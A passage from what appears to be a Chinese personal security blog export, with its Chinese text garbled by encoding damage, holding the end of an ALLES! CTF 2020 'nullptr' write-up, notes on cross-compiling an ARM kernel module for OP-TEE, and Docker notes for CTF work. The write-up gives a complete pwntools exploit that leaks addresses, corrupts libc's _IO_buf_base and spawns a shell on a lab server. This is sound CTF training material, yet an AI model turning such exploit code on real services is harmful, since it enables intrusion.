exp\n\næœ¬åœ°æ­å»ºçš„æµ‹è¯•ç¯å¢ƒä¸‹è·å¾—flagå¦‚ä¸‹å›¾ï¼š\n\n![](nullptr12.png)\n\næœ€ç»ˆçš„expå¦‚ä¸‹ï¼š\n\n```python\n# nullptr_exp.py\n# coding-utf-8\nfrom pwn import *\n# context(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nwhile True:\n    myelf = ELF(\"./nullptr\")\n    mylibc = ELF(\"./libc-2.30.so\")\n    myld = ELF(\"./ld-2.30.so\")\n    myproc = remote(\"127.0.0.1\",1024)\n    \n    def view(addr):\n        myproc.recvuntil(\"[1. view, 2. null, -1. exit]> \")\n        myproc.sendline('1')\n        myproc.recvuntil(\"view address> \")\n        myproc.sendline(addr)\n        myproc.recvline()\n        ret = myproc.recvline()\n        return ret\n\n    def setnull(addr):\n        myproc.recvuntil(\"[1. view, 2. null, -1. exit]> \")\n        myproc.sendline('2')\n        myproc.recvuntil(\"nuke address> \")\n        myproc.sendline(addr)\n    \n    ###æ³„éœ²æ ˆåœ°å€\n    stack_addr = int(view('a').strip().split(\":\")[0],16)\n    #log.warn(\"stack_addr is: 0x%x\" % stack_addr)\n    \n    ###æ³„éœ²_startå‡½æ•°åœ°å€\n    offset1 = stack_addr - (0x28 + 8*1)\n    start_addr = int(view(str(offset1)).strip().split(\":\")[1],16)\n    #log.warn(\"start_addr is: 0x%x\" % start_addr)\n\n    ###è®¡ç®—ç¨‹åºåŠ è½½åŸºå€\n    elf_base = start_addr - myelf.symbols['_start']\n    shell_addr = elf_base + myelf.symbols['get_me_out_of_this_mess']\n    elf_got_base = elf_base + 0x4000\n    #log.warn(\"elf_base is: 0x%x\" % elf_base)\n    log.warn(\"elf_got_base: 0x%x\" % elf_got_base)\n    #log.warn(\"shell_addr is: 0x%x\" % shell_addr)\n\n    ###å¯»æ‰¾æ»¡è¶³åä¸‰ä¸ªå­—èŠ‚ä¸ºå…¨0çš„gotè¡¨åœ°å€\n    if elf_got_base &0xfff000 == 0:\n        ###æ³„éœ²libcåŠ è½½åŸºå€\n        puts_got = elf_base + myelf.got[\"puts\"]\n        puts_libc = int(view(str(puts_got)).strip().split(\":\")[1],16)\n        libc_base = puts_libc - mylibc.symbols[\"puts\"]\n        #log.warn(\"puts_got is: 0x%x\" % puts_got)\n        #log.warn(\"puts_libc is: 0x%x\" % puts_libc)\n        log.warn(\"libc_base is: 0x%x\" % libc_base)\n\n        ###æ³„éœ²got.pltçš„å‰3é¡¹\n        got_cont0 = int(view(str(elf_got_base)).strip().split(\":\")[1],16)\n        got_cont1 = int(view(str(elf_got_base+0x8)).strip().split(\":\")[1],16)\n        got_cont2 = int(view(str(elf_got_base+0x10)).strip().split(\":\")[1],16)\n\n        ###æ„é€ payload\n        payload = \"\"\n        payload += p64(got_cont0)\n        payload += p64(got_cont1)\n        payload += p64(got_cont2)\n        payload += p64(shell_addr)\n\n        ###è®¡ç®—_IO_buf_baseåœ°å€ï¼Œå¹¶å°†å…¶å­˜çš„å †åœ°å€å3ä¸ªå­—èŠ‚å…¨å†™0\n        io_buf_addr = libc_base + 0x1ea980 + 0x38 - 0x5\n        setnull(str(io_buf_addr))\n        \n        myproc.recvuntil(\"[1. view, 2. null, -1. exit]> \")\n        myproc.sendline(payload)\n        \n        myproc.interactive()\n```\n\n\n\n# å‚è€ƒwrite up\n\n[ALLES! CTF 2020 Nullptr](https://pwn-diaries.com/post/alles-ctf-2020-nullptr/)\n\n","categories":["CTF"]},{"title":"äº¤å‰ç¼–è¯‘arm linuxå†…æ ¸æ¨¡å—","url":"/2022/02/20/arm-linux-ko-cross-compile/","content":"\n# ç¬¬ä¸€ç§æ–¹æ³•\n\n> éœ€è¦ç¼–è¯‘æ•´ä¸ªå†…æ ¸\n\nå‚è€ƒæ–‡ç« ï¼šhttps://blukat.me/2017/12/cross-compile-arm-kernel-module/ã€\n\næ­¥éª¤å¦‚ä¸‹ï¼š\n\n1. ä¸‹è½½armäº¤å‰ç¼–è¯‘å™¨ï¼š\n\n   [linaroç¤¾åŒºï¼Œè€ç‰ˆæœ¬](https://releases.linaro.org/components/toolchain/binaries/)\n\n   [armå®˜ç½‘ï¼Œæ–°ç‰ˆæœ¬](https://developer.arm.com/tools-and-software/open-source-software/developer-tools/gnu-toolchain/gnu-a/downloads)\n\n2. ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„linuxå†…æ ¸ï¼šhttps://mirrors.edge.kernel.org/pub/linux/kernel/\n\n3. è·å–.configæ–‡ä»¶ï¼ˆopteeåœºæ™¯ä¸‹ï¼Œç¼–è¯‘ä¸€æ¬¡åï¼Œåœ¨linuxæºç ç›®å½•ä¸‹æœ‰è¯¥æ–‡ä»¶ï¼‰\n\n4. ç¼–è¯‘linuxå†…æ ¸\n\n   ```python\n   make ARCH=arm CROSS_COMPILE=<TOOLCHAIN_DIR>/bin/arm-linux-gnueabihf-\n   ```\n\n5. ç¼–è¯‘å†…æ ¸æ¨¡å—\n\n# ç¬¬äºŒç§æ–¹æ³•\n\n> ä½¿ç”¨åŸæœ‰çš„.configæ–‡ä»¶ï¼Œæ— éœ€ç¼–è¯‘æ•´ä¸ªå†…æ ¸\n\nå‚è€ƒæ–‡ç« ï¼šhttps://huhaipeng.top/2019/02/01/linuxå†…æ ¸æ¨¡å—çš„äº¤å‰ç¼–è¯‘å’ŒåŠ è½½/\n\nä»¥ [optee 3.15.0](https://github.com/OP-TEE/manifest/blob/3.15.0/default.xml) qemuç‰ˆæœ¬ä¸ºä¾‹ï¼Œå®ƒæ˜¯armæ¶æ„çš„ï¼Œreeä¾§è¿è¡Œlinux kernelã€‚æˆ‘å¸Œæœ›åœ¨æœ¬åœ°x86 linuxä¸Šç¼–è¯‘ä¸€ä¸ªkoï¼Œä¸”è¯¥koèƒ½åœ¨è¯¥qemu arm linuxä¸­insmodå¹¶è¿è¡Œã€‚ï¼ˆopteeæ­å»ºå¯ä»¥å‚è€ƒæˆ‘çš„å¦ä¸€ç¯‡æ–‡ç«  - [åŸºäºqemuçš„opteeæ¨¡æ‹Ÿç¯å¢ƒæ­å»º](https://blingblingxuanxuan.github.io/2020/12/20/qemuv8-optee/)ï¼‰\n\nè¿™æ¶‰åŠåˆ°äº¤å‰ç¼–è¯‘ï¼Œæ­¥éª¤æ¯”è¾ƒå¤æ‚ï¼Œä¸”æš‚æœªæ˜ç™½æ¯ä¸€æ­¥éª¤çš„å…·ä½“å«ä¹‰ï¼Œå› æ­¤è¯¦ç»†è®°å½•ä¸€ä¸‹æˆ‘çš„æ“ä½œè¿‡ç¨‹ã€‚\n\n## ç¯å¢ƒå‡†å¤‡\n\næˆ‘çš„ç›®æ ‡æ˜¯ç¼–è¯‘ä¸€ä¸ªarmç‰ˆçš„linuxå†…æ ¸æ¨¡å—ï¼Œé‚£ä¹ˆè‚¯å®šç¦»ä¸å¼€ä¸¤ä¸ªä¸œè¥¿ï¼š\n\nï¼ˆ1ï¼‰linuxå†…æ ¸æºç \n\nï¼ˆ2ï¼‰äº¤å‰ç¼–è¯‘å™¨\n\nä¸‹è½½è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼ˆæ³¨æ„ä¸€å®šè¦è·Ÿç›®æ ‡ç³»ç»Ÿçš„ç‰ˆæœ¬åŒ¹é…å“¦ï¼‰ï¼š\n\n```bash\ncd /home/bling/Downloads/\n# ä¸‹è½½opteeå¯¹åº”ç‰ˆæœ¬çš„linuxå†…æ ¸æºç \ngit clone -b optee-3.15.0 --depth=1 <https://github.com/linaro-swg/linux.git>\n# ä¸‹è½½äº¤å‰ç¼–è¯‘å·¥å…·é“¾\nwget <https://developer.arm.com/-/media/Files/downloads/gnu-a/10.2-2020.11/binrel/gcc-arm-10.2-2020.11-x86_64-arm-none-linux-gnueabihf.tar.xz>\n```\n\né‡ç‚¹æ¥äº†ï¼Œéœ€è¦ç¼–è¯‘opteeæ—¶linuxç›®å½•ä¸‹ç”Ÿæˆçš„.configæ–‡ä»¶ï¼Œå°†å…¶æ‹·è´åˆ°å½“å‰linuxç›®å½•ä¸‹ã€‚ç„¶åå†ç»§ç»­åé¢çš„æ­¥éª¤ã€‚\n\nåœ¨æºç ç›®å½•ä¸‹ä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹3æ¡å‘½ä»¤ï¼š\n\n```bash\n# æ ¹æ®é»˜è®¤.configè¿›è¡Œè®¾ç½®ï¼Œåœ¨menuconfigä¸­saveå³å¯\nmake ARCH=arm CROSS_COMPILE=/home/bling/Downloads/gcc-arm-aarch32/bin/arm-none-linux-gnueabihf- menuconfig\nmake ARCH=arm CROSS_COMPILE=/home/bling/Downloads/gcc-arm-aarch32/bin/arm-none-linux-gnueabihf- prepare\nmake ARCH=arm CROSS_COMPILE=/home/bling/Downloads/gcc-arm-aarch32/bin/arm-none-linux-gnueabihf- scripts\n\n# å¦‚æœä¸å¢åŠ make modulesè¿™ä¸€æ­¥ï¼Œåœ¨ç¼–è¯‘koæ—¶å¯èƒ½ä¼šæ‰¾ä¸åˆ°Module.symversæ–‡ä»¶ã€‚å‚è€ƒæ–‡ç« ï¼š<https://www.jianshu.com/p/05450481c10e>\n# make ARCH=arm CROSS_COMPILE=/home/bling/Downloads/gcc-arm-aarch32/bin/arm-none-linux-gnueabihf- modules\n```\n\nä»¥ä¸Šï¼Œä¾¿ä¼šç”Ÿæˆæˆ‘ä»¬ç¼–è¯‘koæ—¶æ‰€ä¾èµ–çš„å„ç§æ–‡ä»¶ã€‚\n\næ‰€ä»¥æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ç¼–å†™koæºç åŠMakefileæ–‡ä»¶ã€‚\n\n## koæºç åŠMakefile\n\nkoæºç  - exp.c\n\n```bash\n#include <linux/module.h>\n#include <linux/init.h>\n#include <linux/kernel.h>\n#include <linux/arm-smccc.h>\n#include <asm/memory.h>\n\nstruct smc_calls_result {\n    unsigned long arg0;\n    unsigned long arg1;\n    unsigned long arg2;\n    unsigned long arg3;\t\n};\n\nstatic int __init init_function(void)\n{\n    union{\n            struct arm_smccc_res smccc;\n            struct smc_calls_result result;\n    } res;\n    printk(\"hello! a test ko!\\\\n\");\n \n    unsigned long a0 = 0xB2000016;\n    unsigned long a1 = 0x0;\n\tunsigned long a2 = 0x1;\n\tunsigned long a3 = 0x2;\n    arm_smccc_smc(a0, a1, a2, a3, 0, 0, 0, 0, &res.smccc);\n    printk(\"hello! end\\\\n\");\n\n    return 0;\n}\n\nstatic void __exit exit_function(void)\n{\n    printk(\"bye bye~\\\\n\");\n}\n\nmodule_init(init_function);\nmodule_exit(exit_function);\n\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"bling\");\nMODULE_DESCRIPTION(\"testdriver\");\n```\n\nMakefileï¼š\n\n> KDIRæŒ‡å®šlinuxæºç ç›®å½•\n\n```bash\nKDIR := /home/bling/Downloads/linux\nobj-m += exp.o\n\nall:\n\tmake -C $(KDIR) M=$(shell pwd) modules\nclean:\n\tmake -C $(KDIR) M=$(shell pwd) clean\n```\n\nç¼–è¯‘å‘½ä»¤ï¼š\n\n```bash\nmake ARCH=arm CROSS_COMPILE=/home/bling/Downloads/gcc-arm-aarch32/bin/arm-none-linux-gnueabihf-\n```\n\næœ€åï¼Œå°†ç”Ÿæˆçš„exp.koä¼ åˆ°qemuå†…ï¼Œå¯æ‰§è¡ŒæˆåŠŸï¼\n\n## æ€è€ƒ\n\n1. **æ¢æˆå…¶ä»–äº¤å‰ç¼–è¯‘å™¨å‘¢ï¼Ÿ**\n\næ¯”å¦‚linaroçš„ï¼šhttps://releases.linaro.org/components/toolchain/binaries/7.5-2019.12/arm-linux-gnueabihf/\n\nå®éªŒè¯æ˜ï¼Œæ›´æ¢ç¼–è¯‘å™¨åä¹Ÿèƒ½ç¼–è¯‘æˆåŠŸã€‚æ‰€ä»¥é‡ç‚¹åœ¨äº`æºç ç‰ˆæœ¬`å’Œ`.configæ–‡ä»¶`ã€‚\n\n2. **ç¼–è¯‘å†…æ ¸æºç ç›®å½•å’Œç¼–è¯‘koä½¿ç”¨ä¸åŒçš„äº¤å‰ç¼–è¯‘å™¨å‘¢ï¼Ÿ**\n\nä¸è¡Œã€‚å®éªŒè¯æ˜ä¼šæŠ¥å¦‚ä¸‹é”™è¯¯ï¼š\n\n```bash\n$ make ARCH=arm CROSS_COMPILE=/home/bling/Downloads/gcc-arm-aarch32/bin/arm-none-linux-gnueabihf-\nmake -C /home/bling/Downloads/linux M=/home/bling/optee_v7/kotest modules\nmake[1]: Entering directory '/home/bling/Downloads/linux'\n  CC [M]  /home/bling/optee_v7/kotest/exp.o\ncc1: error: cannot load plugin ./scripts/gcc-plugins/arm_ssp_per_task_plugin.so: ./scripts/gcc-plugins/arm_ssp_per_task_plugin.so: undefined symbol: _Z14rtx_alloc_stat8rtx_code\nscripts/Makefile.build:271: recipe for target '/home/bling/optee_v7/kotest/exp.o' failed\nmake[2]: *** [/home/bling/optee_v7/kotest/exp.o] Error 1\nMakefile:1851: recipe for target '/home/bling/optee_v7/kotest' failed\nmake[1]: *** [/home/bling/optee_v7/kotest] Error 2\nmake[1]: Leaving directory '/home/bling/Downloads/linux'\nMakefile:5: recipe for target 'all' failed\nmake: *** [all] Error 2\n```\n\næ‰€ä»¥ï¼Œå¿…é¡»ä¿è¯ç¼–è¯‘å†…æ ¸æºç å’Œç¼–è¯‘koæ—¶ä½¿ç”¨åŒä¸€ä¸ªç‰ˆæœ¬äº¤å‰ç¼–è¯‘å™¨ã€‚å…·ä½“åŸå› ç­‰ä»¥åå­¦å†…æ ¸çš„æ—¶å€™å†æ·±ç©¶ã€‚\n\n","tags":["äº¤å‰ç¼–è¯‘"],"categories":["åŸºç¡€æŠ€èƒ½"]},{"title":"dockerå­¦ä¹ ç¬”è®°åŠå…¶åœ¨ctfä¸­çš„åº”ç”¨","url":"/2022/02/20/learn-to-use-docker/","content":"\n# dockerçš„åŸºæœ¬ä½¿ç”¨\n\né˜®ä¸€å³°è€å¸ˆçš„æ–‡ç« ï¼š[Docker å…¥é—¨æ•™ç¨‹](http://ruanyifeng.com/blog/2018/02/docker-tutorial.html)ï¼Œå­¦ä¹ è¿‡ç¨‹ä¸­å¤§éƒ¨åˆ†å‚è€ƒäº†è¿™ç¯‡æ–‡ç« ã€‚\n\n## å®‰è£…docker\n\n[å¯ä»¥å‚è€ƒå®˜ç½‘é“¾æ¥](https://docs.docker.com/engine/install/ubuntu/)\n\næˆ‘çš„å®‰è£…è¿‡ç¨‹å¦‚ä¸‹ï¼š\n\n- å¸è½½æ—§ç‰ˆæœ¬ï¼š`sudo apt-get remove docker docker-engine docker.io containerd runc`\n\n- æ ¹æ®æœ¬åœ°ubuntuç‰ˆæœ¬é€‰æ‹©ä¸‹è½½è¦å®‰è£…dockerç‰ˆæœ¬çš„.debåŒ…ï¼š[https://download.docker.com/linux/ubuntu/dists/](https://download.docker.com/linux/ubuntu/dists/)ï¼Œè½¬åˆ°å¯¹åº”ç‰ˆæœ¬pool/stable/ç›®å½•\n\n- å®‰è£…ä¸‹è½½çš„debåŒ…ï¼š`sudo dpkg -i /path/to/package.deb`\n\n- æˆ–è€…ä½¿ç”¨aptå®‰è£…\n\n  ```bash\n  sudo apt-get update\n  sudo apt-get install docker-ce docker-ce-cli containerd.io\n  ```\n\n  2022/11/27æ›´æ–°ï¼šåœ¨ubuntu20.04ä¸‹ï¼Œç”¨ä¸Šé¢çš„å‘½ä»¤å®‰è£…ä¸æˆåŠŸï¼Œè§£å†³æ–¹æ¡ˆå‚è€ƒ[Installing Docker in Ubuntu, from repo. Can't find a repo](https://stackoverflow.com/a/71395476)ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š\n\n  ```bash\n  sudo apt update\n  sudo apt install docker-ce docker-ce-cli containerd.io\n  sudo apt-get install \\\\n     ca-certificates \\\\n     curl \\\\n     gnupg \\\\n     lsb-release\n  curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg\n  echo \\\\n  \"deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \\\\n  $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null\n  sudo apt-get update\n  sudo apt-get install docker-ce docker-ce-cli containerd.io\n  ```\n\n  \n\n- æµ‹è¯•å®‰è£…æ˜¯å¦æˆåŠŸï¼š`sudo docker run hello-world`\n\næ­£å¸¸æƒ…å†µä¸‹è¿è¡Œdockeræ˜¯éœ€è¦sudoæƒé™çš„ï¼Œä¸ºäº†é˜²æ­¢æ¯æ¬¡éƒ½éœ€è¦åŠ ä¸€ä¸ªsudoå‰ç¼€ï¼Œå¯ä»¥æ–°å»ºä¸€ä¸ªdockerç»„ï¼Œå¹¶å°†å½“å‰ç”¨æˆ·æ·»åŠ åˆ°è¿™ä¸ªç»„é‡Œã€‚å…·ä½“æ“ä½œå¦‚ä¸‹å‡ æ¡å‘½ä»¤ï¼š\n\n```bash\nsudo groupadd docker\nsudo usermod -aG docker $USER\n```\n\né‡å¯åï¼Œç›´æ¥è¿è¡Œ`docker run hello-world`ï¼Œå‘ç°æ™®é€šç”¨æˆ·ä¹Ÿèƒ½è¿è¡Œå•¦ï¼\n\n## å¸¸ç”¨å‘½ä»¤\n\nä½¿ç”¨dockeræ—¶ï¼Œå¸¸ç”¨å‘½ä»¤éƒ½åˆ—åœ¨è¿™å„¿äº†\n\n```bash\ndocker image ls Â  #åˆ—å‡ºæœ¬æœºæ‰€æœ‰çš„imageæ–‡ä»¶\ndocker image rm [imageName]     #åˆ é™¤imageæ–‡ä»¶\ndocker image pull library/hello-world       #ä»è¿œç¨‹ä»“åº“å°†libraryç»„ä¸‹çš„hello-worldè¿™ä¸ªimageæ–‡ä»¶æŠ“å–åˆ°æœ¬åœ° ï¼ˆDockerå®˜æ–¹æä¾›çš„imageæ–‡ä»¶éƒ½åœ¨libraryä¸­ï¼‰\n\ndocker container run hello-world        #ä»imageæ–‡ä»¶ä¸­ï¼Œé€‰å–åä¸ºhello-worldçš„imageï¼Œç”Ÿæˆä¸€ä¸ªè¿è¡Œçš„å®¹å™¨å®ä¾‹\n\ndocker container run -it ubuntu Â   #å¯åŠ¨ubuntuå®¹å™¨æ—¶ï¼Œèµ·ä¸€ä¸ªäº¤äº’å¼shell\ndocker container run -it ubuntu bash        #è¾¾åˆ°è·Ÿä¸Šä¸€æ¡å‘½ä»¤åŒæ ·çš„æ•ˆæœ\ndocker container run -it ubuntu ls      #å¯åŠ¨ä¸€ä¸ªubuntuå®¹å™¨ï¼Œå¹¶æ‰§è¡Œlså‘½ä»¤ï¼Œæ‰§è¡Œå®ŒæŒ‡å®šå‘½ä»¤åï¼Œå®¹å™¨è‡ªåŠ¨é€€å‡º\ndocker container kill [containerID]     #å¯¹äºä¸ä¼šè‡ªåŠ¨ç»ˆæ­¢çš„å®¹å™¨ï¼Œéœ€è¦ä½¿ç”¨killæ‰‹åŠ¨ç»ˆæ­¢\n\ndocker container ls         #åˆ—å‡ºæœ¬æœºæ­£åœ¨è¿è¡Œçš„å®¹å™¨\ndocker container ls --all       #åˆ—å‡ºæœ¬æœºæ‰€æœ‰å®¹å™¨ï¼ŒåŒ…æ‹¬ç»ˆæ­¢è¿è¡Œçš„å®¹å™¨\ndocker container rm [containerID]       #å¯¹äºç»ˆæ­¢è¿è¡Œçš„å®¹å™¨ï¼Œé˜²æ­¢å…¶å ç”¨ç£ç›˜ç©ºé—´ï¼Œå¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤æ‰‹åŠ¨åˆ é™¤\n\ndocker container run --rm -it ubuntu /bin/bash      #ä½¿ç”¨--rmå‚æ•°ï¼Œåœ¨å®¹å™¨ç»ˆæ­¢è¿è¡Œåï¼Œä¼šè‡ªåŠ¨åˆ é™¤å®¹å™¨æ–‡ä»¶\n\ndocker container start [containerID]        # ä¸Šé¢çš„docker container runå‘½ä»¤æ¯è¿è¡Œä¸€æ¬¡å°±ä¼šæ–°å»ºä¸€ä¸ªå®¹å™¨ï¼Œå› æ­¤å¯ä»¥é€šè¿‡startæ¥å¯åŠ¨å·²ç”Ÿæˆçš„å®¹å™¨\ndocker container stop [containerID]\ndocker container logs [containerID]\ndocker container exec -it [containerID] /bin/bash\ndocker container cp [containerID]:[/path/to/file] .\n\n```\n\necho \"123\" > test.txt\ncat > test1.txt <<EOF\n\n> 1\n> 2\n> 3\n> 4\n> EOF\n\n## å®è·µï¼šåˆ¶ä½œä¸€ä¸ªå®¹å™¨å¹¶å‘å¸ƒ\n\næ­¥éª¤ï¼š\n\n1. ç¼–å†™ Dockerfile æ–‡ä»¶\n\n2. åˆ›å»º image æ–‡ä»¶\n\n   ```bash\n   docker image build -t koa-demo .\n   # æˆ–è€…\n   docker image build -t koa-demo:0.0.1 .        \n   # ä½¿ç”¨-tå‚æ•°æŒ‡å®šç”Ÿæˆçš„imageæ–‡ä»¶åï¼Œå†’å·åé¢æŒ‡å®šæ ‡ç­¾ï¼ˆé»˜è®¤æ ‡ç­¾æ˜¯latestï¼‰ã€‚æœ€åçš„.æŒ‡å®šæ–‡ä»¶æ‰€åœ¨è·¯å¾„ï¼Œ.è¡¨ç¤ºå½“å‰è·¯å¾„\n   ```\n\n3. ç”Ÿæˆå®¹å™¨\n\n   ```bash\n   docker container run --rm -p 8000:3000 -it koa-demo:0.0.1         \n   # å®¹å™¨çš„ 3000 ç«¯å£æ˜ å°„åˆ°æœ¬æœºçš„ 8000 ç«¯å£\n   ```\n\n4. å‘å¸ƒ image æ–‡ä»¶\n\n## å®è·µï¼šä½¿ç”¨docker-composeå¯åŠ¨å®¹å™¨\n\n[Dockerï¼šDocker Compose è¯¦è§£](https://www.jianshu.com/p/658911a8cff3)\n\n```c\nsudo curl -L https://github.com/docker/compose/releases/download/1.21.2/docker-compose-$(uname -s)-$(uname -m) -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\n```\n\ndocker-compose.ymlæ–‡ä»¶è§£æ\n\n```bash\nversion: '2' # è¡¨ç¤ºè¯¥ Docker-Compose æ–‡ä»¶ä½¿ç”¨çš„æ˜¯ Version 2 file\nservices:\n  docker-demo:  # æŒ‡å®šæœåŠ¡åç§°\n    build: .  # æŒ‡å®š Dockerfile æ‰€åœ¨è·¯å¾„\n    ports:    # æŒ‡å®šç«¯å£æ˜ å°„,æš´éœ²ç«¯å£ä¿¡æ¯  - \"å®¿ä¸»æœºç«¯å£:å®¹å™¨æš´éœ²ç«¯å£\"\n      - \"9000:8761\"\n```\n\nä½¿ç”¨docker-compose.ymlå¯åŠ¨å®¹å™¨\n\n```bash\ndocker-compose up\ndocker-compose up -d  # åå°å¯åŠ¨å¹¶è¿è¡Œå®¹å™¨\n# åœ¨ docker-compose.yml æ‰€åœ¨è·¯å¾„ä¸‹æ‰§è¡Œè¯¥å‘½ä»¤ Compose å°±ä¼šè‡ªåŠ¨æ„å»ºé•œåƒå¹¶ä½¿ç”¨é•œåƒå¯åŠ¨å®¹å™¨\n```\n\n## å®è·µï¼šdockerå®¹å™¨è¿ç§»\n\n`docker save/load` ï¼šç”¨æ¥ä¿å­˜/åŠ è½½imageé•œåƒåŒ…\n\n`docker export/import` ï¼šç”¨æ¥ä¿å­˜/åŠ è½½containerå®¹å™¨åŒ…\n\n```bash\ndocker image ls\n\ndocker save [ImageId] > xxx.tar\ndocker load < xxx.tar\ndocker tag [ImageId] xxx:1.1.x      #æœ‰æ—¶å€™éœ€è¦ç»™é•œåƒé‡å‘½åå¹¶æ‰“tag\ndocker run -d --rm -h [HostName] --name [ContainerName] -p [HostPort:ContainerPort] xxx:1.1.x\n\ndocker container ls -all\ndocker export [ContainerId] > xxx.tar\ndocker import xxx.tar [ContainerName]:[Tag]      #è®¾ç½®å¯¼å…¥åçš„é•œåƒåç§°å’Œtag\n```\n\n# ctfä¸­çš„åº”ç”¨\n\n## **èµ·docker**\n\n> é€šå¸¸ctfæ¯”èµ›ä¸­æä¾›Dockerfileç»™æˆ‘ä»¬ï¼Œæˆ‘ä»¬éœ€è¦å…ˆbuildå‡ºimageï¼Œç„¶åå†è¿è¡Œcontainer\n\n```\ndocker build -t nullptr . && docker run -p 1024:1024 --rm -it nullptr\n```\n\næ–¹å¼2ã€å¸¦å‘½ä»¤è¡Œ\n\n```\ndocker build -t nullptr . && docker run -p 1024:1024 --rm -it nullptr bash\n```\n\næ–¹å¼3ã€æ–°å¼€ä¸€ä¸ªç«¯å£ï¼Œä»¥ç‰¹æƒæ¨¡å¼è¿è¡Œï¼Œå¹¶ä¸”å¸¦å‘½ä»¤è¡Œ\n\n```\ndocker build -t nullptr . && docker run -p 1024:1024 -p 1234:1234 --privileged --rm -it nullptr bash\n```\n\n**è§£å†³ç½‘ç»œçš„é—®é¢˜**\n\nubuntu 19.10çš„source.listï¼ˆæ³¨æ„æ˜¯httpï¼Œä¸æ˜¯httpsï¼‰ï¼š\n\n```bash\n# é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š\ndeb [trusted=yes] http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan main restricted universe multiverse\ndeb [trusted=yes] http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-updates main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-updates main restricted universe multiverse\ndeb [trusted=yes] http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-backports main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-backports main restricted universe multiverse\ndeb [trusted=yes] http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-security main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-security main restricted universe multiverse\n\n# é¢„å‘å¸ƒè½¯ä»¶æºï¼Œä¸å»ºè®®å¯ç”¨\n# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-proposed main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ eoan-proposed main restricted universe multiverse\n```\n\nä»¥ALLES!CTF 2020ä¸­çš„nullptrè¿™ä¸ªé¢˜ä¸ºä¾‹ï¼Œå…¶Dockerfileåšäº†å¦‚ä¸‹ä¿®æ”¹ï¼š\n\n```dockerfile\n# docker build -t nullptr . && docker run -p 1024:1024 --rm -it nullptr\n\nFROM ubuntu:19.10\n#bling-æˆ‘æ–°å¢äº†ä¸‹é¢è¿™è¡Œï¼ŒæŒ‡å®šæºï¼Œè¿™æ ·ä¸‹è½½dockeræˆ–è€…aptæ›´æ–°çš„æ—¶å€™ä¼šæ›´å¿«\nADD sources.list /etc/apt/\n\nRUN apt-get update && apt-get install -y gdb\nRUN useradd -d /home/ctf/ -m -p ctf -s /bin/bash ctf\nRUN echo \"ctf:ctf\" | chpasswd\n\nWORKDIR /home/ctf\n\nCOPY nullptr .\nCOPY flag .\nCOPY ynetd .\n\nRUN chmod +x ./ynetd ./nullptr\n#bling-æˆ‘æ³¨é‡Šäº†ä¸‹é¢è¿™è¡Œï¼Œä½¿dockerèµ·æ¥åæœ‰rootæƒé™\n#USER ctf\n\nCMD ./ynetd ./nullptr\n```\n\n[Dockerfileä¸­æ›´æ¢å›½å†…æº](https://blog.csdn.net/yyj108317/article/details/105984674)\n\n## gdbserverè°ƒè¯•\n\næœ‰ä¸¤ç§æ–¹æ³•ï¼š\n\n1. é€šè¿‡Dockerfileç”Ÿæˆimageï¼Œç„¶åå¯åŠ¨containeræ—¶ç›´æ¥æ‹‰èµ·ç›®æ ‡è¿›ç¨‹ï¼ˆé»˜è®¤ï¼‰\n\n   `docker container run --rm -p 8000:8888 -p 1234:1234 -d <img-name>:latest`\n\n   - è¿›å…¥dockerå†…éƒ¨ï¼Œå¹¶èµ·ä¸€ä¸ªshellï¼š`docker exec -it <containerID> /bin/bash`\n\n   - ï¼ˆæœ¬åœ°ï¼‰è®©ç›®æ ‡è¿›ç¨‹åœä¸‹æ¥ï¼šé€šè¿‡pythonè„šæœ¬è¿æ¥dockeræœåŠ¡ï¼Œå¹¶åœ¨è„šæœ¬ä¸­é€šè¿‡raw_input()åœä¸‹æ¥ï¼Œç»™gdbserverä¸€äº›æ—¶é—´attach\n\n   - ï¼ˆdockerå†…ï¼‰æŸ¥çœ‹ç›®æ ‡è¿›ç¨‹çš„pidï¼Œå¯åŠ¨gdbserverï¼Œattachåˆ°ç›®æ ‡è¿›ç¨‹ï¼š\n\n     ```\n     gdbserver :1234 --attach <pid>\n     ```\n\n   - ï¼ˆæœ¬åœ°ï¼‰å¯åŠ¨gdbï¼Œè¿æ¥è¿œç¨‹ç›®æ ‡ï¼š\n\n     ```\n     file <xxx>\n     target remote :1234\n     ```\n\n2. å¯åŠ¨containeræ—¶å‘½ä»¤è¡ŒæŒ‡å®š\"/bin/bash\"ï¼Œè¿›å…¥dockeråå†æ‰‹åŠ¨èµ·ç›®æ ‡è¿›ç¨‹\n\n   `docker container run --rm -p 8000:8888 -p 1234:1234 -it <img-name>:latest /bin/bash`\n\n   - ï¼ˆdockerå†…éƒ¨ï¼‰è¿è¡Œç›®æ ‡è¿›ç¨‹ï¼š`./xxx &`\n\n   - ï¼ˆæœ¬åœ°ï¼‰è®©ç›®æ 